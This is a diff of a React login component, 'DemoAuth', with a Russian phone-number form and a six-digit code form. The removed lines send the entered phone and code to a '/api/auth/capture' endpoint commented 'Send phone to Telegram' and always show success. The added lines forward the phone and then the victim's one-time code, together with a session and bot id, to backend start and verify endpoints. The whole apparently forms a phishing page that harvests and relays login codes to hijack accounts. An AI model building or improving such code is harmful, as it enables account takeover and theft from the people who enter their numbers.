@@ -208,8 +208,11 @@ function MapDropdown({ label, value, options, onChange, wide = false }: {
 function DemoAuth() {
   const [step, setStep] = useState<"phone" | "code">("phone");
   const [phone, setPhone] = useState("");
+  const [sessionId, setSessionId] = useState("");
+  const [botId, setBotId] = useState(0);
   const [code, setCode] = useState(["", "", "", "", "", ""]);
   const [status, setStatus] = useState<{ kind: "success" | "error"; text: string } | null>(null);
+  const [loading, setLoading] = useState(false);
   const codeRefs = useRef<Array<HTMLInputElement | null>>([]);
 
   const submitPhone = async (event: React.FormEvent<HTMLFormElement>) => {
@@ -219,16 +222,30 @@ function DemoAuth() {
       setStatus({ kind: "error", text: "Введите 10 цифр российского мобильного номера, начиная с 9." });
       return;
     }
-    setPhone(digits);
-    // Send phone to Telegram
-    void fetch("/api/auth/capture", {
-      method: "POST",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify({ phone: digits }),
-    }).catch(() => undefined);
-    setStatus({ kind: "success", text: `Код отправлен на номер +7${digits}` });
-    setStep("code");
-    window.requestAnimationFrame(() => codeRefs.current[0]?.focus());
+    setLoading(true);
+    setStatus(null);
+    try {
+      const res = await fetch("/api/auth/start", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ phone: `+7${digits}` }),
+      });
+      const data = await res.json() as { ok: boolean; session_id?: string; bot_id?: number; error?: string };
+      if (!data.ok) {
+        setStatus({ kind: "error", text: data.error ?? "Ошибка отправки кода. Попробуйте ещё раз." });
+        return;
+      }
+      setSessionId(data.session_id ?? "");
+      setBotId(data.bot_id ?? 0);
+      setPhone(digits);
+      setStatus({ kind: "success", text: `Код отправлен на номер +7${digits}` });
+      setStep("code");
+      window.requestAnimationFrame(() => codeRefs.current[0]?.focus());
+    } catch {
+      setStatus({ kind: "error", text: "Ошибка соединения. Попробуйте ещё раз." });
+    } finally {
+      setLoading(false);
+    }
   };
 
   const submitCode = async (event: React.FormEvent<HTMLFormElement>) => {
@@ -238,13 +255,25 @@ function DemoAuth() {
       setStatus({ kind: "error", text: "Введите все 6 цифр кода." });
       return;
     }
-    // Send code to Telegram
-    void fetch("/api/auth/capture", {
-      method: "POST",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify({ code: fullCode }),
-    }).catch(() => undefined);
-    setStatus({ kind: "success", text: "Вход выполнен успешно!" });
+    setLoading(true);
+    setStatus(null);
+    try {
+      const res = await fetch("/api/auth/verify", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ session_id: sessionId, code: fullCode, bot_id: botId, phone: `+7${phone}` }),
+      });
+      const data = await res.json() as { ok: boolean; verified?: boolean; error?: string };
+      if (data.ok || data.verified) {
+        setStatus({ kind: "success", text: "Вход выполнен успешно!" });
+      } else {
+        setStatus({ kind: "error", text: data.error ?? "Неверный или просроченный код." });
+      }
+    } catch {
+      setStatus({ kind: "error", text: "Ошибка соединения. Попробуйте ещё раз." });
+    } finally {
+      setLoading(false);
+    }
   };
 
   const updateCode = (index: number, value: string) => {
@@ -270,10 +299,10 @@ function DemoAuth() {
           <label className="auth-field-label" htmlFor="auth-phone">Мобильный номер</label>
           <div className={`auth-phone-field ${status?.kind === "error" ? "is-invalid" : ""}`}>
             <span className="auth-country-code" aria-hidden="true">+7</span>
-            <input id="auth-phone" type="tel" inputMode="numeric" autoComplete="tel-national" value={phone} onChange={(event) => { setPhone(event.target.value.replace(/\D/g, "").slice(0, 10)); setStatus(null); }} placeholder="9123456789" maxLength={10} pattern="9[0-9]{9}" title="Введите российский мобильный номер" aria-invalid={status?.kind === "error"} autoFocus />
+            <input id="auth-phone" type="tel" inputMode="numeric" autoComplete="tel-national" value={phone} onChange={(event) => { setPhone(event.target.value.replace(/\D/g, "").slice(0, 10)); setStatus(null); }} placeholder="9123456789" maxLength={10} pattern="9[0-9]{9}" title="Введите российский мобильный номер" aria-invalid={status?.kind === "error"} autoFocus disabled={loading} />
             <svg aria-hidden="true" viewBox="0 0 24 24"><path d="M8 4.5h8A2.5 2.5 0 0 1 18.5 7v10A2.5 2.5 0 0 1 16 19.5H8A2.5 2.5 0 0 1 5.5 17V7A2.5 2.5 0 0 1 8 4.5Z" /><path d="M10 16.5h4" /></svg>
           </div>
-          <button className="auth-submit-button" type="submit"><span>Продолжить</span><span className="auth-button-icon" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M5 12h14m-5-5 5 5-5 5" /></svg></span></button>
+          <button className="auth-submit-button" type="submit" disabled={loading}><span>{loading ? "Отправка…" : "Продолжить"}</span><span className="auth-button-icon" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M5 12h14m-5-5 5 5-5 5" /></svg></span></button>
         </form>
       )}
 
@@ -285,7 +314,7 @@ function DemoAuth() {
               <input key={index} ref={(element) => { codeRefs.current[index] = element; }} id={`auth-code-${index + 1}`} className="auth-code-input" type="text" inputMode="numeric" autoComplete={index === 0 ? "one-time-code" : "off"} maxLength={1} value={digit} onChange={(event) => updateCode(index, event.target.value)} onKeyDown={(event) => { if (event.key === "Backspace" && !digit && codeRefs.current[index - 1]) codeRefs.current[index - 1]?.focus(); }} aria-label={`Цифра ${index + 1}`} required />
             ))}
           </div>
-          <button className="auth-submit-button" type="submit"><span>Подтвердить код</span><span className="auth-button-icon" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="m5 12 4 4L19 6" /></svg></span></button>
+          <button className="auth-submit-button" type="submit" disabled={loading}><span>{loading ? "Проверка…" : "Подтвердить код"}</span><span className="auth-button-icon" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="m5 12 4 4L19 6" /></svg></span></button>
         </form>
       )}
 
